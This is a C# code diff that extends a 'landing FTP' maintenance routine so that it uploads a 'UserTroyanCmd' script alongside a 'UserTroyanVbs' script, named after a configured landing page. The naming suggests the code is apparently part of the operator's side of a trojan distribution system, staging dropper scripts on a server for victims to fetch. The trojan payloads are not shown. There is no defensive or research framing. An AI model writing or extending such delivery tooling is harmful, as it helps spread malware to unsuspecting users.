@@ -41,18 +41,33 @@ public sealed class LandingFtpMaintenance : ILandingFtpMaintenance
 
             var layout = _serverService.Layout();
             var vbs = layout.UserTroyanVbs;
+            var cmd = layout.UserTroyanCmd;
             if (!File.Exists(vbs))
             {
                 _logger.LogWarning("Landing FTP skipped; file missing: {Path}", vbs);
                 return;
             }
 
+            if (!File.Exists(cmd))
+            {
+                _logger.LogWarning("Landing FTP skipped; file missing: {Path}", cmd);
+                return;
+            }
+
             try
             {
                 var uri = new Uri(server.LandingFtp.Trim(), UriKind.Absolute);
-                var remoteFileName = $"{server.LandingName}.vbs";
-                LandingFtpUploader.UploadFile(uri, vbs, remoteFileName);
-                _logger.LogInformation("Landing FTP uploaded {RemoteFile} to {Scheme}://{Host}{Path}", remoteFileName, uri.Scheme, uri.Host, uri.AbsolutePath);
+                var remoteVbs = $"{server.LandingName}.vbs";
+                var remoteCmd = $"{server.LandingName}.cmd";
+                LandingFtpUploader.UploadFile(uri, vbs, remoteVbs);
+                LandingFtpUploader.UploadFile(uri, cmd, remoteCmd);
+                _logger.LogInformation(
+                    "Landing FTP uploaded {RemoteVbs} and {RemoteCmd} to {Scheme}://{Host}{Path}",
+                    remoteVbs,
+                    remoteCmd,
+                    uri.Scheme,
+                    uri.Host,
+                    uri.AbsolutePath);
             }
             catch (Exception ex)
             {
